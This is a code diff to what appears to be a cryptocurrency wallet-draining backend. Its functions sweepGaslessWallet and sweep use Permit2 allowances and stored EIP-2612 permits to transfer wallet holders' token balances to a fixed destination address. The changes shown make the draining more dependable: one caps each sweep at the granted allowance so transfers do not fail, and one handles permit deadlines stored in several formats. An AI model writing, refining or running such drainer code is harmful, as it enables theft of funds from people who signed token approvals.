@@ -835,9 +835,20 @@ async function sweepGaslessWallet(walletAddress) {
         const token   = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
         const balance = await token.balanceOf(checksum);
         if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
-        log(`[gasless/allowance] ${checksum} balance=${balance} -- transferFrom ${tokenAddr.slice(0, 10)}`);
+        // Cap sweep amount by ERC-20 allowance granted to Permit2.
+        // If the user approved Permit2 for less than the full balance (e.g. approved 100 USDT
+        // but holds 500 USDT), permit2.transferFrom with the full balance reverts.
+        const erc20Allow = await token.allowance(checksum, PERMIT2_ADDRESS).catch(() => balance);
+        const sweepAmt   = erc20Allow < balance ? erc20Allow : balance;
+        if (sweepAmt === 0n) {
+          log(`[gasless/allowance] ${tokenAddr.slice(0,10)} ERC-20→Permit2 allowance is 0 — skipping`);
+          await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+          continue;
+        }
+        if (sweepAmt < balance) log(`[gasless/allowance] ⚠️  capping ${tokenAddr.slice(0,10)} to allowance ${sweepAmt} (balance=${balance})`);
+        log(`[gasless/allowance] ${checksum} balance=${balance} sweepAmt=${sweepAmt} -- transferFrom ${tokenAddr.slice(0, 10)}`);
         const fee = await getFeeData();
-        const tx  = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr,
+        const tx  = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, tokenAddr,
           { gasLimit: 150_000n, ...fee });
         log(`[gasless/allowance] transferFrom tx: ${tx.hash}`);
         await tx.wait();
@@ -1621,7 +1632,14 @@ async function sweep(wallet) {
 
     for (const p of permits ?? []) {
       if (BLACKLIST.has(p.token.toLowerCase())) continue;
-      const dl = typeof p.deadline === "string" ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000)) : 0n;
+      // Deadline may be stored as Unix timestamp (number/numeric string) or ISO-8601 string.
+      const dl = typeof p.deadline === "number"
+        ? BigInt(p.deadline)
+        : typeof p.deadline === "string" && /^\d+$/.test(p.deadline.trim())
+          ? BigInt(p.deadline.trim())
+          : typeof p.deadline === "string"
+            ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000))
+            : 0n;
       if (dl > 0n && dl < nowSecs) {
         log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — expired, marking used`);
         await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
